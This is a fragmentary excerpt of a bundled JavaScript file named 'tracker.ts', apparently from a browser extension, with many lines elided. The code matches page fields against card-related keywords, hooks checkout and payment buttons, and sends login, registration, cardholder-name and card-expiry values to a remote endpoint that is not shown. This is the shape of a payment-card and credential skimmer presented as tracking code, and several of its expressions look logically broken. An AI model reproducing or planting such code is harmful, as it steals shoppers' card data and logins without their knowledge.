...
function initDb() {
    if (window.sessionStorage) {
        if (window.sessionStorage.getItem('ip') === null) {
            Object(_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__["sendRequest"])({
                method: "GET",
            ...
            if (window.sessionStorage.getItem('ip') !== null) {
                ...
                if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
                    if (request.command === 'saveLoginData') {
                        return Object(_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__["sendRequest"])({
                            method: "POST",
                                                ...
                                                if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                                                    Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                                        __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                                            if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 && __attribute.nodeValue.toLowerCase().indexOf('none' || false || false) === -1) {
                                                                elements.push(__childElement);
                                                            }
                                                        });
                                                    });
                            ...
                            if (__buttonElement.classList.contains('btnConfirmPayment')) {
                                send({
                                    ...
                                    data: {
                                        ...
                                        'cardExpire': document.querySelector('#ccExpirationMonth').value ? document.querySelector('#ccExpirationMonth').value :  true ? document.querySelector('#ccExpirationYear').value : undefined,
                            ...
                            document.querySelector('#placeOrder').addEventListener('click', function () {
                                ...
                                send({
                                    ...
                                    data: {
                                        ...
                                        'cardHolder': document.querySelector('#firstName').value !== null ? document.querySelector('#firstName').value : 'Unknown' + ' ' + document.querySelector('#lastName').value !== null ? document.querySelector('#lastName').value : 'Unknown',
                                        'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 'Unknown',
                    ...
                    controller.addEventListener('click', function () {
                        ...
                        send({
                            ...
                            data: {
                                ...
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value :  true ? paymentMethodData[4].value : undefined,
...
/***/ 7:
/*!*********************************************!*\
  !*** multi ./Assets/typescripts/tracker.ts ***!
  \*********************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! ./Assets/typescripts/tracker.ts */"./Assets/typescripts/tracker.ts");
